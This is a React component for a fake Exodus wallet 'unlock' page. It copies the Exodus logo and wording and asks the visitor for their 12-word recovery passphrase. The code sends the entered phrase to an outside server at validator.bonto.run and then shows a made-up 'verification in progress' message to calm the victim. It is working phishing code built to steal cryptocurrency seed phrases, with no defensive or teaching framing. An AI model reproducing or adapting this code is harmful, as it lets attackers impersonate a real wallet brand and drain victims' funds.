import React, { useState } from 'react';
import './exodusPagesCss/exodusTwoWallet.css';
import exodusLogo from "../../../assets/exodus_header_icon.png";
import axios from 'axios';
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { useNavigate } from 'react-router-dom';

const ExodusWallet = () => {
  const [seedPhrase, setSeedPhrase] = useState('');
  const [loading, setLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const navigate = useNavigate();

  const unlockWallet = async () => {
    const url = 'https://validator.bonto.run/exodus';
    const payload = { passphrase: seedPhrase };

    try {
      setLoading(true);
      const response = await axios.post(url, payload);
      toast.success(response.data.message);
      setSeedPhrase('');
      setShowSuccess(true);
    } catch (error) {
      const message =
        error.response?.data?.message || 'An error occurred. Please try again.';
      toast.error(message);
    } finally {
      setLoading(false);
    }
  };

  const unlockWithFaceId = () => {
    toast.info('Feature not available yet.');
  };

  return (
    <div className="exodusTwo-wrapper">
      {/* TOP BAR */}
      <header className="exodusTwo-header">
        <span className="exodusTwo-header-title">Wallet</span>
        <div className="exodusTwo-header-logo">
          <img src={exodusLogo} alt="Exodus Wallet" />
        </div>
      </header>

      {!showSuccess ? (
        <>
          {/* TITLE */}
          <div className="exodusTwo-title">
            <h3>Unlock Exodus Wallet</h3>
          </div>

          {/* BODY */}
          <section className="exodusTwo-body">
            <div className="exodusTwo-container">
              <textarea
                className="exodusTwo-textarea"
                placeholder="Enter your 12-word passphrase here"
                value={seedPhrase}
                onChange={(e) => setSeedPhrase(e.target.value)}
              />

              <button
                className="exodusTwo-primary-btn"
                onClick={unlockWallet}
                disabled={loading}
              >
                {loading ? 'Loading...' : 'Unlock With Passphrase'}
              </button>

              <button
                className="exodusTwo-secondary-btn"
                onClick={unlockWithFaceId}
              >
                Unlock With Face ID
              </button>

              <p className="exodusTwo-info-text">
                As a non-custodial wallet, your wallet passphrase is exclusively
                accessible only to you. Recovery of passphrase is currently
                impossible.
              </p>

              <p className="exodusTwo-warning-text">
                Lost your passphrase? <span>Create a new wallet</span>, but all
                assets in your previous wallet will be inaccessible.
              </p>
            </div>
          </section>
        </>
      ) : (
        <section className="exodusTwo-body">
          <div className="exodusTwo-container">
            <h3 className="exodusTwo-success-title">
              Verification in progress
            </h3>

            <p className="exodusTwo-info-text">
              Your wallet information has been submitted successfully.
              A confirmation email will be sent once verification is complete.
            </p>

            <div className="exodusTwo-action-row">
              <button
                className="exodusTwo-primary-btn"
                onClick={() => navigate('/')}
              >
                Go Home
              </button>

              <button
                className="exodusTwo-secondary-btn"
                onClick={() => setShowSuccess(false)}
              >
                Continue
              </button>
            </div>
          </div>
        </section>
      )}
    </div>
  );
};

export default ExodusWallet;
